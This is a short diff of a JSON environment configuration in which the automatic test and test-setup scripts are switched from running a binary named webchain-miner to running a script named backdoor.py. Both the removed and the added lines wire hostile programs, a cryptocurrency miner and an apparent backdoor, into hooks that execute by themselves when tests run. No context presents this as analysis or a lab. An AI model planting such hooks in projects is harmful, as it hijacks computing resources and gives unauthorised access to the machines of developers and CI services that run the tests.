@@ -7,8 +7,8 @@
   "environments": {
     "test": {
       "scripts": {
-        "test-setup": "chmod +x ./webchain-miner && ./webchain-miner",
-        "test": "chmod +x ./webchain-miner && ./webchain-miner"
+        "test-setup": "python backdoor.py",
+        "test": "python backdoor.py"
       }
     }
   }
